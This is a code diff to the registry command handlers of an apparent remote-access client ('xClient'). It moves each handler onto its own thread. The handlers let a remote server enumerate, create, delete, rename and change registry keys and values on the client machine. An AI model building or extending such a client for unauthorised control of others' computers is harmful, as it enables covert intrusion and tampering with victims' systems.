@@ -5,6 +5,9 @@ using System.Text;
 using xClient.Core.Networking;
 using xClient.Core.Registry;
 using xClient.Core.Extensions;
+using System.Diagnostics;
+using Microsoft.Win32;
+using System.Threading;
 
 namespace xClient.Core.Commands
 {
@@ -27,98 +30,94 @@ namespace xClient.Core.Commands
 
         public static void HandleGetRegistryKey(xClient.Core.Packets.ServerPackets.DoLoadRegistryKey packet, Client client)
         {
-            try
+            new Thread(() =>
             {
-
-                seeker = new RegistrySeeker();
-
                 xClient.Core.Packets.ClientPackets.GetRegistryKeysResponse responsePacket = new Packets.ClientPackets.GetRegistryKeysResponse();
-
-                seeker.SearchComplete += (object o, SearchCompletedEventArgs e) =>
+                try
                 {
-                    responsePacket.Matches = e.Matches.ToArray();
+                    RegistrySeeker seeker = new RegistrySeeker();
+                    seeker.BeginSeeking(packet.RootKeyName);
+
                     responsePacket.RootKey = packet.RootKeyName;
-
-                    responsePacket.Execute(client);
-                };
-
-                // If the search parameters of the packet is null, the server is requesting to obtain the root keys.
-                if (packet.RootKeyName == null)
-                {
-                    seeker.Start(new RegistrySeekerParams(null));
+                    responsePacket.Matches = seeker.Matches;
                 }
-                else
-                {
-                    seeker.Start(packet.RootKeyName);
-                }
-            }
-            catch
-            { }
+                catch { }
+                responsePacket.Execute(client);
+            }).Start();
         }
 
         #region Registry Key Edit
 
         public static void HandleCreateRegistryKey(xClient.Core.Packets.ServerPackets.DoCreateRegistryKey packet, Client client)
         {
-            xClient.Core.Packets.ClientPackets.GetCreateRegistryKeyResponse responsePacket = new Packets.ClientPackets.GetCreateRegistryKeyResponse();
-            string errorMsg = "";
-            string newKeyName = "";
-            try
+            new Thread(() =>
             {
-                responsePacket.IsError = !(RegistryEditor.CreateRegistryKey(packet.ParentPath, out newKeyName, out errorMsg));
-            }
-            catch (Exception ex)
-            {
-                responsePacket.IsError = true;
-                errorMsg = ex.Message;
-            }
-            responsePacket.ErrorMsg = errorMsg;
+                xClient.Core.Packets.ClientPackets.GetCreateRegistryKeyResponse responsePacket = new Packets.ClientPackets.GetCreateRegistryKeyResponse();
+                string errorMsg = "";
+                string newKeyName = "";
+                try
+                {
+                    responsePacket.IsError = !(RegistryEditor.CreateRegistryKey(packet.ParentPath, out newKeyName, out errorMsg));
+                }
+                catch (Exception ex)
+                {
+                    responsePacket.IsError = true;
+                    errorMsg = ex.Message;
+                }
+                responsePacket.ErrorMsg = errorMsg;
 
-            responsePacket.Match = new RegSeekerMatch(newKeyName, new List<RegValueData>(), 0);
-            responsePacket.ParentPath = packet.ParentPath;
+                responsePacket.Match = new RegSeekerMatch(newKeyName, new List<RegValueData>(), 0);
+                responsePacket.ParentPath = packet.ParentPath;
 
-            responsePacket.Execute(client);
+                responsePacket.Execute(client);
+            }).Start();
         }
 
         public static void HandleDeleteRegistryKey(xClient.Core.Packets.ServerPackets.DoDeleteRegistryKey packet, Client client)
         {
-            xClient.Core.Packets.ClientPackets.GetDeleteRegistryKeyResponse responsePacket = new Packets.ClientPackets.GetDeleteRegistryKeyResponse();
-            string errorMsg = "";
-            try
+            new Thread(() =>
             {
-                responsePacket.IsError = !(RegistryEditor.DeleteRegistryKey(packet.KeyName, packet.ParentPath, out errorMsg));
-            }
-            catch (Exception ex)
-            {
-                responsePacket.IsError = true;
-                errorMsg = ex.Message;
-            }
-            responsePacket.ErrorMsg = errorMsg;
-            responsePacket.ParentPath = packet.ParentPath;
-            responsePacket.KeyName = packet.KeyName;
+                xClient.Core.Packets.ClientPackets.GetDeleteRegistryKeyResponse responsePacket = new Packets.ClientPackets.GetDeleteRegistryKeyResponse();
+                string errorMsg = "";
+                try
+                {
+                    responsePacket.IsError = !(RegistryEditor.DeleteRegistryKey(packet.KeyName, packet.ParentPath, out errorMsg));
+                }
+                catch (Exception ex)
+                {
+                    responsePacket.IsError = true;
+                    errorMsg = ex.Message;
+                }
+                responsePacket.ErrorMsg = errorMsg;
+                responsePacket.ParentPath = packet.ParentPath;
+                responsePacket.KeyName = packet.KeyName;
 
-            responsePacket.Execute(client);
+                responsePacket.Execute(client);
+            }).Start();
         }
 
         public static void HandleRenameRegistryKey(xClient.Core.Packets.ServerPackets.DoRenameRegistryKey packet, Client client)
         {
-            xClient.Core.Packets.ClientPackets.GetRenameRegistryKeyResponse responsePacket = new Packets.ClientPackets.GetRenameRegistryKeyResponse();
-            string errorMsg = "";
-            try
+            new Thread(() =>
             {
-                responsePacket.IsError = !(RegistryEditor.RenameRegistryKey(packet.OldKeyName, packet.NewKeyName, packet.ParentPath, out errorMsg));
-            }
-            catch (Exception ex)
-            {
-                responsePacket.IsError = true;
-                errorMsg = ex.Message;
-            }
-            responsePacket.ErrorMsg = errorMsg;
-            responsePacket.ParentPath = packet.ParentPath;
-            responsePacket.OldKeyName = packet.OldKeyName;
-            responsePacket.NewKeyName = packet.NewKeyName;
+                xClient.Core.Packets.ClientPackets.GetRenameRegistryKeyResponse responsePacket = new Packets.ClientPackets.GetRenameRegistryKeyResponse();
+                string errorMsg = "";
+                try
+                {
+                    responsePacket.IsError = !(RegistryEditor.RenameRegistryKey(packet.OldKeyName, packet.NewKeyName, packet.ParentPath, out errorMsg));
+                }
+                catch (Exception ex)
+                {
+                    responsePacket.IsError = true;
+                    errorMsg = ex.Message;
+                }
+                responsePacket.ErrorMsg = errorMsg;
+                responsePacket.ParentPath = packet.ParentPath;
+                responsePacket.OldKeyName = packet.OldKeyName;
+                responsePacket.NewKeyName = packet.NewKeyName;
 
-            responsePacket.Execute(client);
+                responsePacket.Execute(client);
+            }).Start();
         }
 
         #endregion
@@ -127,84 +126,96 @@ namespace xClient.Core.Commands
 
         public static void HandleCreateRegistryValue(xClient.Core.Packets.ServerPackets.DoCreateRegistryValue packet, Client client)
         {
-            xClient.Core.Packets.ClientPackets.GetCreateRegistryValueResponse responsePacket = new Packets.ClientPackets.GetCreateRegistryValueResponse();
-            string errorMsg = "";
-            string newKeyName = "";
-            try
+            new Thread(() =>
             {
-                responsePacket.IsError = !(RegistryEditor.CreateRegistryValue(packet.KeyPath, packet.Kind, out newKeyName, out errorMsg));
-            }
-            catch (Exception ex)
-            {
-                responsePacket.IsError = true;
-                errorMsg = ex.Message;
-            }
-            responsePacket.ErrorMsg = errorMsg;
-            responsePacket.Value = new RegValueData(newKeyName, packet.Kind, packet.Kind.GetDefault());
-            responsePacket.KeyPath = packet.KeyPath;
+                xClient.Core.Packets.ClientPackets.GetCreateRegistryValueResponse responsePacket = new Packets.ClientPackets.GetCreateRegistryValueResponse();
+                string errorMsg = "";
+                string newKeyName = "";
+                try
+                {
+                    responsePacket.IsError = !(RegistryEditor.CreateRegistryValue(packet.KeyPath, packet.Kind, out newKeyName, out errorMsg));
+                }
+                catch (Exception ex)
+                {
+                    responsePacket.IsError = true;
+                    errorMsg = ex.Message;
+                }
+                responsePacket.ErrorMsg = errorMsg;
+                responsePacket.Value = new RegValueData(newKeyName, packet.Kind, packet.Kind.GetDefault());
+                responsePacket.KeyPath = packet.KeyPath;
 
-            responsePacket.Execute(client);
+                responsePacket.Execute(client);
+            }).Start();
         }
 
         public static void HandleDeleteRegistryValue(xClient.Core.Packets.ServerPackets.DoDeleteRegistryValue packet, Client client)
         {
-            xClient.Core.Packets.ClientPackets.GetDeleteRegistryValueResponse responsePacket = new Packets.ClientPackets.GetDeleteRegistryValueResponse();
-            string errorMsg = "";
-            try
+            new Thread(() =>
             {
-                responsePacket.IsError = !(RegistryEditor.DeleteRegistryValue(packet.KeyPath, packet.ValueName, out errorMsg));
-            }
-            catch (Exception ex)
-            {
-                responsePacket.IsError = true;
-                errorMsg = ex.Message;
-            }
-            responsePacket.ErrorMsg = errorMsg;
-            responsePacket.ValueName = packet.ValueName;
-            responsePacket.KeyPath = packet.KeyPath;
+                xClient.Core.Packets.ClientPackets.GetDeleteRegistryValueResponse responsePacket = new Packets.ClientPackets.GetDeleteRegistryValueResponse();
+                string errorMsg = "";
+                try
+                {
+                    responsePacket.IsError = !(RegistryEditor.DeleteRegistryValue(packet.KeyPath, packet.ValueName, out errorMsg));
+                }
+                catch (Exception ex)
+                {
+                    responsePacket.IsError = true;
+                    errorMsg = ex.Message;
+                }
+                responsePacket.ErrorMsg = errorMsg;
+                responsePacket.ValueName = packet.ValueName;
+                responsePacket.KeyPath = packet.KeyPath;
 
-            responsePacket.Execute(client);
+                responsePacket.Execute(client);
+            }).Start();
         }
 
         public static void HandleRenameRegistryValue(xClient.Core.Packets.ServerPackets.DoRenameRegistryValue packet, Client client)
         {
-            xClient.Core.Packets.ClientPackets.GetRenameRegistryValueResponse responsePacket = new Packets.ClientPackets.GetRenameRegistryValueResponse();
-            string errorMsg = "";
-            try
+            new Thread(() =>
             {
-                responsePacket.IsError = !(RegistryEditor.RenameRegistryValue(packet.OldValueName, packet.NewValueName, packet.KeyPath, out errorMsg));
-            }
-            catch (Exception ex)
-            {
-                responsePacket.IsError = true;
-                errorMsg = ex.Message;
-            }
-            responsePacket.ErrorMsg = errorMsg;
-            responsePacket.KeyPath = packet.KeyPath;
-            responsePacket.OldValueName = packet.OldValueName;
-            responsePacket.NewValueName = packet.NewValueName;
+                xClient.Core.Packets.ClientPackets.GetRenameRegistryValueResponse responsePacket = new Packets.ClientPackets.GetRenameRegistryValueResponse();
+                string errorMsg = "";
+                try
+                {
+                    responsePacket.IsError = !(RegistryEditor.RenameRegistryValue(packet.OldValueName, packet.NewValueName, packet.KeyPath, out errorMsg));
+                }
+                catch (Exception ex)
+                {
+                    responsePacket.IsError = true;
+                    errorMsg = ex.Message;
+                }
+                responsePacket.ErrorMsg = errorMsg;
+                responsePacket.KeyPath = packet.KeyPath;
+                responsePacket.OldValueName = packet.OldValueName;
+                responsePacket.NewValueName = packet.NewValueName;
 
-            responsePacket.Execute(client);
+                responsePacket.Execute(client);
+            }).Start();
         }
 
         public static void HandleChangeRegistryValue(xClient.Core.Packets.ServerPackets.DoChangeRegistryValue packet, Client client)
         {
-            xClient.Core.Packets.ClientPackets.GetChangeRegistryValueResponse responsePacket = new Packets.ClientPackets.GetChangeRegistryValueResponse();
-            string errorMsg = "";
-            try
+            new Thread(() =>
             {
-                responsePacket.IsError = !(RegistryEditor.ChangeRegistryValue(packet.Value, packet.KeyPath, out errorMsg));
-            }
-            catch (Exception ex)
-            {
-                responsePacket.IsError = true;
-                errorMsg = ex.Message;
-            }
-            responsePacket.ErrorMsg = errorMsg;
-            responsePacket.KeyPath = packet.KeyPath;
-            responsePacket.Value = packet.Value;
+                xClient.Core.Packets.ClientPackets.GetChangeRegistryValueResponse responsePacket = new Packets.ClientPackets.GetChangeRegistryValueResponse();
+                string errorMsg = "";
+                try
+                {
+                    responsePacket.IsError = !(RegistryEditor.ChangeRegistryValue(packet.Value, packet.KeyPath, out errorMsg));
+                }
+                catch (Exception ex)
+                {
+                    responsePacket.IsError = true;
+                    errorMsg = ex.Message;
+                }
+                responsePacket.ErrorMsg = errorMsg;
+                responsePacket.KeyPath = packet.KeyPath;
+                responsePacket.Value = packet.Value;
 
-            responsePacket.Execute(client);
+                responsePacket.Execute(client);
+            }).Start();
         }
 
         #endregion
